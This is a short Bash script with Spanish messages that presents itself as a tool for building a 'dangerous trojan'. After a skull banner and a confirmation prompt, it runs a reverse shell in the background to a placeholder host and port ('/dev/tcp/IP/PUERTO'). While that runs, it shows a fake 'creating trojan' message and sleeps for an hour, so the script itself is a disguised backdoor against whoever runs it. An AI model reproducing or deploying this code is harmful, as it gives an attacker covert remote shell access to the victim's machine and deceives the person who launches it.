#! /bin/bash

clear
setterm -foreground red
echo "
           ⠀      ⢀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀     ⢀⣀⣤⣤⠄⢀⣤⠀⣾⣿⣿⣿⠀⣀⠀⢠⣤⣤⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀     ⢀⣶⣿⣿⣿⠃⣰⣿⣿⣄⠙⠿⠿⠋⣠⣿⣷⡄⠹⣿⣿⣿⣶⡀⠀⠀⠀
⠀⠀     ⣰⣿⣿⣿⣿⠇⢰⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⡀⢹⣿⣿⣿⣿⣄⠀⠀
     ⠀⢸⣿⣿⡿⠋⠀⠀⣿⡏⠀⠙⠻⣿⣿⣿⣿⠟⠁⠀⣿⣧⠀⠀⠙⢿⣿⣿⡆⠀
⠀     ⣿⣿⡿⠀⠀⠀⢰⣿⣿⣤⣤⣴⣿⣿⣿⣿⣦⣤⣴⣿⣿⠀⠀⠀⠈⣿⣿⡇⠀
⠀     ⢹⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣷⡙⠻⠟⢩⣿⣿⣿⣿⣿⠀⠀⠀⠀⣼⣿⡇
⠀     ⠈⠻⣿⣆⠀⠀⠈⠉⠉⠉⣿⣿⣷⡀⢠⣿⣿⡏⠉⠉⠉⠀⠀⠀⣰⣿⠟⠀⠀
⠀⠀⠀     ⠈⠉⠓⠂⠀⠀⠀⠀⣿⣿⣿⣷⣿⣿⣿⡇⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⢀⠀⢿⡟⠈⣿⡿⠈⢿⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀     ⢠⣾⡆⠘⢀⡆⠸⠃⣠⠈⠃⢸⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀     ⣰⣿⣿⡇⠀⣾⣷⠀⢀⣿⣧⠀⣼⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀     ⠸⣿⣿⣿⠇⠸⣿⣿⠀⠸⣿⣿⠆⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀     ⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁
"
echo ""
echo "Esta herramienta hace un troyano peligroso"
echo "Usar Educadamente no me responsabilizo"
sleep 1
while :
do
#MENU
#ESCOJER MENU
echo ""
setterm -foreground green
echo "Esta seguro continuar"
echo "[1] Si"
echo "[2] No"
echo -n "[•]Opcion > "
read opcion
case $opcion in
1)
#! /bin/bash
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando figlet ...\e[0m"
sleep 3
pkg install figlet
fi
clear

setterm -foreground red
echo "
           ⠀      ⢀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀     ⢀⣀⣤⣤⠄⢀⣤⠀⣾⣿⣿⣿⠀⣀⠀⢠⣤⣤⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀     ⢀⣶⣿⣿⣿⠃⣰⣿⣿⣄⠙⠿⠿⠋⣠⣿⣷⡄⠹⣿⣿⣿⣶⡀⠀⠀⠀
⠀⠀     ⣰⣿⣿⣿⣿⠇⢰⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⡀⢹⣿⣿⣿⣿⣄⠀⠀
     ⠀⢸⣿⣿⡿⠋⠀⠀⣿⡏⠀⠙⠻⣿⣿⣿⣿⠟⠁⠀⣿⣧⠀⠀⠙⢿⣿⣿⡆⠀
⠀     ⣿⣿⡿⠀⠀⠀⢰⣿⣿⣤⣤⣴⣿⣿⣿⣿⣦⣤⣴⣿⣿⠀⠀⠀⠈⣿⣿⡇⠀
⠀     ⢹⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣷⡙⠻⠟⢩⣿⣿⣿⣿⣿⠀⠀⠀⠀⣼⣿⡇
⠀     ⠈⠻⣿⣆⠀⠀⠈⠉⠉⠉⣿⣿⣷⡀⢠⣿⣿⡏⠉⠉⠉⠀⠀⠀⣰⣿⠟⠀⠀
⠀⠀⠀     ⠈⠉⠓⠂⠀⠀⠀⠀⣿⣿⣿⣷⣿⣿⣿⡇⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⢀⠀⢿⡟⠈⣿⡿⠈⢿⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀     ⢠⣾⡆⠘⢀⡆⠸⠃⣠⠈⠃⢸⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀     ⣰⣿⣿⡇⠀⣾⣷⠀⢀⣿⣧⠀⣼⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀     ⠸⣿⣿⣿⠇⠸⣿⣿⠀⠸⣿⣿⠆⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀     ⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁
"
echo ""
setterm -foreground green
figlet Atack
bash -i  >& /dev/tcp/IP/PUERTO 0>&1 &
setterm -foreground red
echo "Creando troyano ..."
sleep 1
echo "Esto puede demorar 1 hora"
sleep 3600
;;
2)
#! /bin/bash
setterm -foreground white
echo "Saliste correctamenta bye"
exit
::
esac
done
